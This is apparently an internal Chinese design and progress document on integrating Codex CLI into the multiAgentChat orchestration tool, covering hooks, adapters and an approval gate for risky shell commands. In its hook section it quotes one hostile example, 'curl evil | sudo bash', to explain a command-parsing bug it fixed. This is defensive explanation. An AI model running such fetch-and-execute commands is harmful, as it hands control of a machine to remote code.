# Codex ↔ multiAgentChat 对接方案

> 设计草案（未动手）。目标：让 multiAgentChat 从「绑死 Claude Code + Terminal.app」解耦成**多 agent / 多宿主**平台，先把 **Codex** 接进来。
> 背景：本机用 Claude Code，团队里有同事用 **Codex**。要「都支持」，但 CLI 与桌面版**不是一回事**（见 §2）。
> 本文只谈方案，不含实现代码。file:line 均指当前仓库。

## 1. 一句话结论

**「支持 Codex」= 两条正交轴，别混为一谈**：

| 轴 | 差异内容 | 成本 | 结论 |
|---|---|---|---|
| **Agent 种类**（codex vs claude） | 回传钩子 / 启动命令 / 登录文案 / prompt 措辞 / skill 目录 | 💚 便宜 | 抽 `AgentAdapter` 即可 |
| **宿主形态**（Terminal.app TUI vs Electron GUI） | 怎么 send / 怎么读输出 / 怎么回车 | 🔴 昂贵，是项目地基假设 | 抽 `HostBackend`；GUI 后端记档不投机做 |

- **Codex CLI**（跑在 Terminal.app tab）→ ✅ **一等公民**，复用 100% 现有 host 层，工作量 ~1–2 天。
- **Codex 桌面版**（Electron GUI）→ 🟡 **不做成一等公民**，走「桥接到 CLI」+ 可选「只读回传桥」；完整 GUI 驱动仅在业务刚需时才做。

## 2. 关键事实（实证 + 架构）

### 2.1 项目地基：只有一种宿主
- 全系统建立在**「AppleScript 控制 Terminal.app 的 tab」**：`host-mac` 枚举 tab（`listTabs`）、读 scrollback（`history of tab`）、送文本（`do script`）、送真回车（System Events `key code 36`）、截屏、推断状态。
- 三层解耦已抽的是 **传输**（`IMTransport`：lark/wecom）。**宿主没抽象**——`host-mac` 是唯一实现，daemon 直接 import。**agent 也没抽象**——全程假设 claude。

### 2.2 Claude Code 专属耦合点（要为 codex 适配的清单）
> ⚠ 下表 file:line 是 **C1 前的 before 快照**（现已全部接线到 AgentAdapter，见 §6 落地记）；如 `status.ts` 的 `hasClaude`、`restart.ts` 的硬编码 `claude` 均已改走 adapter。表仅作"当时要改哪些"的记录。

| # | 耦合点 | 位置 | 改动量 |
|---|---|---|---|
| 1 | **回传通道**（alt-screen 下唯一输出渠道） | `~/.claude/settings.json` hooks.Stop → `bin/mchat-stop-hook`；安装逻辑 `apps/daemon/src/index.ts:61-140` | 🔴 中（codex 需等价物） |
| 2 | **agent 进程识别** | `host-mac/src/terminal/status.ts:54`（`hasClaude` 只认 `claude`/`claude-code`/`*/claude`） | 💚 小 |
| 3 | **登录态识别** | `status.ts:29-40`（`LOGIN_PATTERNS` 全是 `Sign in to Claude` / `console.anthropic.com`） | 💚 小 |
| 4 | **启动 / 重启命令** | `host-mac/src/terminal/restart.ts:104`（硬编码 `claude` / `claude --continue`） | 💚 小 |
| 5 | **内建 slash 转发白名单** | `im-lark/src/lark/commands.ts:118-131`（`/help /config /model /agents /skills` 是 Claude Code 的） | 🟡 中 |
| 6 | **SYSTEM_GUIDANCE** | `im-lark/src/lark/handlers.ts:17-43` + `watcher.ts`（机制无关，但措辞/内建命令假设 claude） | 💚 小（措辞） |
| 7 | **skill 目录** | `orchestrator/src/integrations/skills.ts:7`（已双写 `~/.claude/skills` + `~/.agents/skills`） | ✅ 已兼容 |
| 8 | `claude -p` headless（planner/knowledge/report） | 多处 | ✅ 不阻塞（后台自动化，与用户用啥无关，继续用本机 claude） |

### 2.3 Codex 的回传面（对照 Claude 的 Stop hook）
- Claude Code：`hooks.Stop` → 脚本 stdin 收 JSON（`last_assistant_message` / `cwd` / `session_id`），见 `bin/mchat-stop-hook`。
- **Codex：`~/.codex/config.toml` 的 `notify` 程序**——turn 结束（`agent-turn-complete`）触发外部程序，payload 带最后消息 + turn 信息。**这是 codex 侧的等价物**，是引擎级钩子（非 TUI 级）。
- ⚠ 待验证：`notify` payload 的确切 schema + 是否对**桌面版**也触发（若是，则桌面版「只出不进」的回传免费拿到，见 §4.2）。

### 2.4 本机 Codex 形态（实证）
- `~/.codex` 是**桌面 App 形态**，非 CLI：含 `goals_1.sqlite` / `memories_1.sqlite` / `.personality_migration` / `computer-use` / `cua_node`（computer-use agent node）/ `plugins` / `marketplaces`——终端 CLI 不会有这些。
- `config.toml` 引用的 `/Applications/Codex.app` **已不存在**，且全盘**无 `codex` CLI 二进制**（cargo/brew/npm/app 内均无）。→ 本机两形态当前都跑不起来，但残留证明用过桌面版。
- **重要洞察**：桌面版与 CLI **共用同一账号**（`~/.codex/auth.json`）。桌面版用户几分钟即可装 CLI、同一登录 → 这是「桥接到 CLI」策略的基础。

## 3. 对接方案（新增两个抽象，对齐 `IMTransport`）

组合模型：
```
daemon = HostBackend × AgentAdapter × IMTransport
今天：    terminal-mac × claude       × lark
加 CLI：   terminal-mac × codex        × lark   ← 只多一个 adapter
加桌面：   codex-app(future) × codex   × lark   ← 未来多一个 HostBackend，现在不做
```

### 3.1 `AgentAdapter`（agent-agnostic，新增）
把 §2.2 的差异收进一个接口，daemon 按 tab 检测结果选 adapter：
> ⚠ 下方为**设计草图**；C1 已实现，**最终接口以 `packages/orchestrator/src/agents/types.ts` 为准**（实际差异：`resumeCommand` 折进 `launchCommand({continueSession})`；`installReturnChannel()` 方法改为数据字段 `returnChannel`，安装逻辑在 daemon `installCodexNotify()`；无 `systemGuidance`；`detect(procLower:string)` 单串；`skillDirs`→`skillDirsFromHome`；另有 `displayName`/`binaryName`/`unverified`）。
```ts
interface AgentAdapter {
  kind: 'claude' | 'codex';
  detect(processes: string[]): boolean;      // 这个 tab 在跑我吗
  loginPatterns: RegExp[];                    // 登录态识别
  launchCommand(opts): string;               // 如何启动
  resumeCommand(opts): string;               // 如何重启/续接
  installReturnChannel(host: HostBackend): void;  // upsert Stop hook / notify 程序
  systemGuidance(): string;                   // per-agent 引导文案
  builtinSlashCommands: string[];             // 转发白名单
  skillDirs: string[];                        // ~/.claude/skills vs ~/.agents/skills
}
```
- 回传通道是唯一 **agent×host 交叉耦合**的点 → 建模成 `installReturnChannel(host)`。
- 落位：新建 `packages/orchestrator/src/agents/`（传输无关、宿主无关）导出 registry；`host-mac` 的 `status.ts` / `restart.ts` 改成调 adapter；daemon 启动时对每种已启用 agent 调 `installReturnChannel`。

### 3.2 `HostBackend`（host-agnostic，抽现有 host-mac）
```ts
interface HostBackend {
  kind: 'terminal-mac' | 'codex-app' | 'tmux' | ...;
  listSessions(): Session[];
  getHistory(id): string;
  send(id, text): void;
  forceEnter(id): void;
  captureScreen(id): Buffer;
}
```
- 现有 `host-mac` **就是** `terminal-mac` 实现，只是没抽接口。第一步只做「抽接口、行为不变」的纯重构（有单测护着）。
- 未来 `host-codex-app`（Electron/CDP）实现同一接口即可插入——**本方案不实现它**，只留位。

### 3.3 Codex CLI adapter 的具体内容
1. **`installReturnChannel`**：写 `bin/mchat-codex-notify`（对照 `mchat-stop-hook`：读 codex notify payload → `agent lark send-text --auto`；同样 fire-and-forget `detached` + 立即 exit；同样跳过内部 headless）+ daemon 幂等 upsert 进 `~/.codex/config.toml` 的 `notify`。
2. **detect**：进程名含 `codex`。
3. **loginPatterns**：codex 的登录/未认证文案。
4. **launch/resume**：`codex` / codex 的续接命令（待查官方文档，§5）。
5. **guidance**：SYSTEM_GUIDANCE 的 codex 变体——去掉 Claude Code 内建 slash 假设，保留 `agent lark send-text/ask/request-approval`（两边都能跑 shell，通吃）。
6. **builtinSlash**：codex 内建命令集（替换 claude 那套）。
7. **skillDirs**：`~/.agents/skills`（已双写，见 `skills.ts:7`）。

### 3.4 `/connect` 里加 Codex 项
- 在 `orchestrator/src/integrations/registry.ts` 加一项 `codex`（`skillType` 或新 `agentType`），状态 = adapter 是否已装 + 回传钩子是否已 upsert。
- `agent connect codex` / 飞书 `/connect` → 检测 CLI 是否存在：
  - 有 CLI → 装回传钩子、提示可用。
  - 只有桌面版 → 走 §4.2 引导装 CLI。

## 4. Codex 桌面版：为什么不驱动 GUI，怎么办

> **结论（当前状态）**：桌面版**不直接支持**，是设计决定不是遗漏。**Codex CLI = 一等公民**（C1+C2+C3 已做）；**桌面版 = 桥接到 CLI**（同账号装 CLI，几分钟）。纯桌面版本身最多有个**未验证的只读回传桥**（只出不进），远程发指令那半边架构上做不了。完整 GUI 驱动记档不开工。

### 4.1 为什么不做一等公民
- 不在 Terminal tab 里 → `do script` / `history of tab` **全部失效**，整个 host 层不适用。
- 驱动 Electron 只有两条脏路：**CDP**（`--remote-debugging-port` 重启 app 后戳私有 DOM，每次 app 更新可能崩）或 **macOS Accessibility**（AXUIElement 读/点，脆且慢）。
- 往 contenteditable 注入 + 从流式 DOM 稳定读回响应 = 研究课题，非 feature。等于新写 `host-codex-app` 后端 + 长期维护税。
- 且**价值低**：GUI 本来就是给坐 Mac 前的人用的；用手机模拟点 GUI 窗口既脆又违背 multiAgentChat 的终端范式。

### 4.2 推荐：桥接到 CLI（+ 可选只读回传桥）
- **桥接**：`agent connect codex` 检测到桌面版 → 引导同事装 Codex CLI（同账号 `~/.codex/auth.json`，几分钟）。桌面留着手动用，多agent 调度走 CLI。
- **可选·只读桥（80/20，半就位）**：`notify` 是**引擎级**钩子，且桌面版与 CLI **共用 `~/.codex/config.toml`**。C2 已把 `notify = ["…/mchat-codex-notify"]` upsert 进这份共用 config → **如果桌面版也执行 `config.toml` 的 `notify`**，那用桌面版跑对话时响应**可能也会自动推飞书**（只出不进：看结果，不能远程发指令），无需额外开发。
  - ⏳ **未验证**：需一台**真跑着桌面 App** 的机器（本机 `/Applications/Codex.app` 当前不存在，只有 `~/.codex` 残留）跑一轮，看 `mchat-codex-notify` 是否被触发（`/tmp/mchat-codex-notify.log` 会记）。成立则白捡；不成立则桌面版无回传。
  - **输入注入（远程发指令给桌面版）无解** —— 这半边不因 notify 而改变。
- **完整 GUI 驱动**（`host-codex-app`：CDP/Accessibility 驱动 Electron）→ 仅当同事坚决拒绝 CLI 且业务刚需时才做；先记档，不投机开发。

## 5. 分阶段计划

| 阶段 | 内容 | 依赖 | 状态 |
|---|---|---|---|
| **C1** | 抽 `AgentAdapter`（`orchestrator/agents/`：interface + claude + codex + registry）+ claude 消费端接线（status/restart/commands）| — | ✅ **已完成**（claude byte-identical，实测验证） |
| **C0** | 抽 `HostBackend` 接口（纯重构） | — | 降级/暂缓（仅 Codex **桌面** GUI 才需要；CLI 复用现有 Terminal 宿主，不需要） |
| **C2** | Codex CLI 回传通道：`bin/mchat-codex-notify` + daemon `installCodexNotify()` upsert `~/.codex/config.toml` 的 `notify` + 状态标签按 `agent.kind` 分派 | C1 ✅ | ✅ **已完成**（实测已 upsert；仅 notify payload 待真机 turn 验） |
| **C3** | codex 作为 `agentType` 对接：`/connect` 列 codex（检测 CLI/登录/notify + 引导）+ `agent connect codex` CLI | C2 ✅ | ✅ **已完成**（实测 `agent connect codex` 出真实三态） |
| **C4**（可选） | 桌面版只读回传桥：notify 已 upsert 进共用 config.toml → **半就位**，待一台真跑桌面 App 的机器验证是否触发（见 §4.2） | §6 验证 | 半就位·待验 |
| **C5** | **与 claude 能力打平**：codex lifecycle hooks（Stop 回传 + PreToolUse 高危审批）+ 回车提交 + guidance 分流 + watcher/notifier 认 codex + 重启不串台 + 新开 tab 按默认 agent | codex ≥ 0.154 | ✅ **已完成**（见 §8；hook 真机触发待验） |
| **C-future** | `host-codex-app`（Electron GUI 驱动，输入注入） | 有刚需才启 | 记档不做 |

**Codex CLI 对接闭环达成（C1+C2+C3），能力打平见 §8（C5）。** claude 行为始终 byte-identical。所有 agent 专属逻辑从 `orchestrator/agents/` 一处流出。C0（HostBackend）只对**桌面 App** 有意义（CLI 走"桥接到 CLI"），降级暂缓。**唯一剩**：codex `login` 后跑一轮验 notify payload（`/tmp/mchat-codex-notify.log` 会记原始 payload）→ 摘 `codexAdapter.unverified`。

## 6. 待拍板 / 需提供 / 需验证

已核实（codex-cli 0.144.5，`codex --help`）：
- ✅ **启动 / 续接命令**：交互式 `codex`；续接 `codex resume --last`。
- ✅ **分发方式**：`npm i -g @openai/codex`（也有 brew `codex`）。本机已装+API key 登录。
- ✅ **headless**（对标 `claude -p`）：`codex exec`（别名 `e`）非交互跑。
- ✅ **进程名/config**：进程名 `codex`；config = `~/.codex/config.toml`。

仍待：
1. **同事的 Codex 是 CLI 还是桌面?**（gating——即使桌面答案也是「桥接到 CLI」，不是死路）
2. **`notify` payload schema**（`type=agent-turn-complete` / `last-assistant-message` 字段名、触发时机）——**C2 里跑一次真机 turn（配 notify 脚本）落实**，是 `codexAdapter.unverified` 仅剩的一处。
3. **桌面版是否执行 `config.toml` 的 `notify`**（决定 C4 只读桥）——需一台真跑桌面版的机器测。

> 落地记（实现文件索引）：
> - **C1**：`packages/orchestrator/src/agents/`（`types`/`claude`/`codex`/`registry`）；消费端 `host-mac/status.ts`（识别+登录+标签）/`restart.ts`（isClaudeTab+启动命令）、`im-lark/commands.ts`（slash 白名单）。
> - **C2**：`bin/mchat-codex-notify`（ESM notify 钩子）+ `apps/daemon/src/index.ts` 的 `installCodexNotify()`（TOML upsert，非破坏+备份）。
> - **C3**：`orchestrator/agents/codex-status.ts`（`codexAgentStatus`/`codexNextStep`）+ registry `agentType:'codex'` + `envfile.ts` 状态计算 + `connectStatusCard` agent 分支 + handlers `connect-config` agent 分支 + `cli.ts` `agent connect codex`。

## 7. 与现有约定的衔接

- 回传钩子脚本沿用 `bin/mchat-stop-hook` 的铁律：**ESM**（root `package.json` 是 `"type":"module"`，`require()` 会静默 crash）、fire-and-forget `detached` + `unref` + 立即 `exit 0`、跳过内部 headless（`MCHAT_INTERNAL_SESSION=1` / 父进程含 `-p`）。见 CLAUDE.md「Stop hook 脚本必须 ESM」。
- 新增对接项按第 8 条约定：改 registry + `/connect` + `agent connect`，并在 `CHANGELOG.md` 顶部追加。
- adapter/backend 放 `orchestrator`（宿主无关、传输无关）；host 相关实现留 `host-mac`；飞书专属的引导卡才留 `im-lark`。

---

## 8. C5 · 与 claude 的**能力打平**（2026-09-14）

> 目标从「codex 能被远程调度」抬到「**codex 用起来和 claude 一样**」。
> 触发点是一个此前不成立的新事实：**codex CLI 0.154+ 内置了一套与 Claude Code 同构的 lifecycle hooks**。

### 8.1 关键发现：codex 的 hook 协议与 Claude Code 同构

`codex --help` 里出现了 `--dangerously-bypass-hook-trust`，顺着挖到 codex 二进制**内嵌的 JSON Schema**
（`<event>.command.input` / `.output`，可用 `strings` 抽出）。逐字比对结论：

| 面 | claude | codex 0.154 |
|---|---|---|
| 事件名 | `Stop` / `PreToolUse` / `PostToolUse` / `UserPromptSubmit` / `SessionStart` … | **同名** |
| 入参 | stdin JSON：`hook_event_name` / `session_id` / `cwd` / `transcript_path` / `last_assistant_message`（Stop）/ `tool_name` / `tool_input`（PreToolUse） | **逐字相同**（多一个 `turn_id`，标注为 "Codex extension"） |
| 出参 | `hookSpecificOutput.{hookEventName,permissionDecision,permissionDecisionReason}` / `decision` / `continue` | **逐字相同** |
| 配置 | `~/.claude/settings.json` 的 `hooks.<Event>[]`（JSON） | `~/.codex/config.toml` 的 `[[hooks.<Event>]]`（TOML），条目结构同为 `matcher` + `hooks:[{type:'command',command}]` |

→ **同一批 `bin/mchat-*` 脚本可以两边复用**，不用为 codex 重写一套。

**两个必须记住的差异**（踩了就是静默失效）：
1. **`matcher` 在 codex 是正则**，而且是全值匹配（内部包成 `\A(?:…)\z`）。claude 那边是字面量工具名。
   → 「匹配全部」在 claude 写 `*`，在 codex 必须写 `.*`；把 `*` 原样搬过去 = 非法正则 = 这条 hook 直接不生效。
   `tests/agents.test.ts` 有断言钉住。
2. **hook 要用户一次性授信**。codex 会校验 `hooks.state."<name>".trusted_hash`，新增/改动的 hook 在批准前不跑
   （TUI 里 `/hooks` 批准；`--dangerously-bypass-hook-trust` 是自动化专用，不该给交互会话用）。
   → 所以 legacy `notify` **保留为兜底**，两条通道并存时靠 `bin/lib/push-dedupe.mjs` 去重。
   ⚠ 去重的判据是**「上一次是不是另一条通道推的」，不是纯内容**：`ppid` 是会话级的，
   纯内容（哪怕加 ppid）会让同一个 tab 里两次不同 turn 的相同文本被吞掉第二条 ——
   而「所有回复都要推飞书」是硬约定。记通道名之后，claude（只有 Stop 一条通道）**恒放行**。

### 8.2 装了哪些（单一事实源：`codexAdapter.hookInstall.specs`）

| 事件 | matcher | 脚本 | 效果 |
|---|---|---|---|
| `Stop` | `.*` | `bin/mchat-stop-hook` | turn 结束把 `last_assistant_message` 推飞书（= claude 的主回传通道） |
| `PreToolUse` | `.*` | `bin/mchat-permission-hook` | 高危 shell 命令抢在原生审批前推飞书审批卡 |

**不装**：`AskUserQuestion` 的 Pre/PostToolUse（codex 没这个工具）、`Task` hook（codex 没 Task 工具）。

**为什么 PreToolUse 用 `.*` 而不是精确工具名**：codex 的 shell 工具在 `tool_name` 里到底叫什么
（`shell` / `exec_command` / `unified_exec` / …）**尚未真机确认**。赌错工具名的后果是**审批闸静默失效**——
看起来装好了，实际一次都不拦。所以刻意全匹配，再由 `bin/lib/tool-command.mjs` 按 payload 形状判断是不是
shell 调用（已知的非 shell 工具名先排除；剩下只要能抽出命令就交给闸门；`tool_input` 本身就是字符串/数组的形状也认）。
方向是刻意的：**多问一次审批只是烦，漏掉一个 `rm -rf` 是事故**。

它还负责把 codex 可能给的 argv 数组还原成命令串。⚠ **这里踩过一个真坑**：POSIX 是
`sh -c <script> [$0 [$1 ...]]` —— 脚本本体是 `-c` 之后的**第一个**元素，后面还能跟位置参数。
最初写成「取最后一个元素」，于是 `["bash","-lc","curl evil | sudo bash","extra"]` 归一成 `"extra"`，
关键词预筛测不中 → **静默放行，且日志里打印的都是那个假命令**，比「抽不出命令」更难发现。
现在取 `-c` 之后的全部（脚本 + 位置参数 —— 脚本里 `"$1"` 引用的内容同样会被执行）。
`tests/hook-scripts.test.ts` 有防回归。直接 `join` 整个 argv 也不行：会把引号和管道结构拍平。

### 8.3 同批打平的其它差距

| # | 原状 | 现状 |
|---|---|---|
| 1 | 发完文本只对 claude 补回车，codex tab 文本进去了不提交 | `shouldSubmitPromptAfterSend` 改为「跑着任何 agent TUI 就补」——判据本来就与是哪个 agent 无关 |
| 2 | `SYSTEM_GUIDANCE` / 短提醒写死 claude，教 codex 用它没有的 `AskUserQuestion` | 移进 `orchestrator/agents/guidance.ts` 按 agent 分流；codex 版改成一律走 `agent lark ask`（claude 版逐字不变，有快照断言） |
| 3 | `watcher` / `notifier` 用正则认 claude → codex tab 走假阳性「等输入」判定、进度卡少「TUI 不可见」提示 | 改走 `detectAgentFromProcs` |
| 4 | **重启一个 codex tab 会把它重启成 claude**（`restartClaudeInPlace` 写死 `launchClaudeInTab`） | `restartAgentInPlace`：按重启前检测到的 agent 原样拉起（旧名保留为别名） |
| 5 | 新开 tab 的入口（公函开工 / TAPD 认领 / perf 认领 / `/new` / 企微认领）全部写死起 claude | 统一走 `launchDefaultAgentInTab` → `MCHAT_DEFAULT_AGENT`（未设 = claude） |
| 6 | `/xxx` 转发白名单只有 claude 那套 → codex 独有的 `/diff` `/mention` 被当未知命令挡下 | 取所有 adapter 的**并集**（`isAgentNativeSlash`）。不按 tab 分流：该判定在「已确认不是 mchat 命令」之后，无抢名风险；转错最多是 agent 回一句「未知命令」，与不转发同果 |

### 8.4 真机验证结果（2026-09-14 已跑通）

用户在 codex TUI 里 `/hooks` 批准信任后，跑了一轮真实 turn（`codex exec --sandbox read-only`，
`MCHAT_HOOK_DEBUG=1`）。codex 输出里出现 `hook: PreToolUse` / `hook: Stop`，日志证据：

| 项 | 结果 |
|---|---|
| hook 是否真触发 | ✅ 两条都触发 |
| `last_assistant_message` 字段名 | ✅ Stop hook 拿到 `len=19` 的消息，正是回复 "curl version 8.7.1."（19 字符） |
| 审批闸能否从真实 payload 抽出命令 | ✅ `gate check ppid=71696 cmd=curl --version` —— **不赌 tool_name、按 payload 形状判断**的策略成立；daemon 返回 `passthrough`，未误弹卡 |
| notify payload 格式 | ✅ 同一轮里 notify 也抽出了同一条消息 |
| 两条通道是否同 ppid | ✅ 实测同为 `83551` —— 去重设计的前提成立 |

**同一轮暴露并修掉的两个真 bug**（都是静态审查看不出来的）：

1. **信任记录会被下次 upsert 删掉。** 用户批准后 codex 把 `[hooks.state]` / `trusted_hash` 写进
   config.toml，而插入位置在**我们的 END 哨兵之前**（codex 把文件尾部注释当尾注，新表插在它前面）
   → 落在托管区块**内部**。下次 daemon 重启整块替换就把信任记录一起删了 →
   hook 变回未信任、**静默不执行**，回传悄悄退化成只剩 notify，用户收不到任何提示。
   修法：`extractHooksState()` 把这段捞出来挪到区块**之外**，之后 codex 追加的 state 也落在区块外。
2. **`codex exec` 的 headless 判定永远不命中。** 真机父进程命令行是
   `node /Users/…/bin/codex exec …`（两层都带 `exec`），`codex` 前面是 `/` 不是空格，
   而原正则写的是 `(^|\s)codex\s+(exec|e)` → 后台 `codex exec` 的输出会被推去飞书。
   修法：判定抽到 `bin/lib/headless.mjs`（允许路径前缀，有真机样本单测）。
   复验：一条 99 字符回复现在正确记为 `skip: headless/internal session`，两条通道都拦住。

**仍未验证 / 需要复核的假设**：
1. **codex 的退出手势**：已拍板**按双 Ctrl-C 处理**，与 claude 共用 `restartAgentInPlace` 的那段逻辑
   （见 §8.3 第 4 行）。⚠ 这是决定，不是实测结论 —— 没有真去关过一个 codex tab。
   故障表征很明确：重启 codex tab 时返回「Ctrl-C N 次仍未退出」。真碰到就改这一处
   （次数 / 间隔，或改用 `/quit`）。
2. **headless 判定只验证过两种调用链**：`node …/bin/codex exec …`（JS wrapper）与
   `…/vendor/…/bin/codex exec …`（原生二进制）。判定只看**直接父进程**一层，
   若有人再包一层不含 `codex` 字样的脚本去起 `codex exec`，仍会漏判（输出被推飞书）。
3. **信任记录的插入位置**。`extractHooksState()` 的切法（从第一个 `[hooks.state` 一路吃到区块末尾）
   建立在本次真机观察上，**不是 codex 的文档承诺**。若将来 codex 改成把 state 插在托管区块
   **中间**，夹在中间的 hook 定义会被一并搬走。
   → 下次走「改 hook 定义 → 重新 `/hooks` 批准 → 重启 daemon」流程时专门复核一次，结果补回本节。

> 落地记（C5 实现文件索引）：
> - adapter：`orchestrator/agents/types.ts`（`AgentHookSpec`/`AgentHookInstall`）、`claude.ts`/`codex.ts`（specs + guidance）、`guidance.ts`（文案分流）、`registry.ts`（`resolveDefaultAgentKind`/`shouldSubmitPromptAfterSend`）、`hook-install.ts`（**纯逻辑**：claude JSON upsert + codex TOML 渲染/幂等）
> - daemon：`installClaudeCodeHooks()` 改 spec 驱动 + 新增 `installCodexHooks()`（只动哨兵区块，备份 `.mchat-hooks.bak`）
> - hook 脚本：`bin/mchat-stop-hook`、`bin/mchat-permission-hook`（工具名不再写死 `Bash`）、`bin/lib/push-dedupe.mjs`（跨通道去重）、`bin/lib/tool-command.mjs`（命令提取）、`bin/lib/headless.mjs`（headless 判定）
> - host：`host-mac/terminal/restart.ts`（`restartAgentInPlace` / `launchDefaultAgentInTab`）
> - 消费端：`im-lark` 的 `handlers.ts` / `watcher.ts` / `notifier.ts`；`/connect` 的 `codex-status.ts` + `envfile.ts` + `cli.ts`
> - 测试：`tests/agents.test.ts`、`tests/agent-hook-install.test.ts`、`tests/hook-scripts.test.ts`
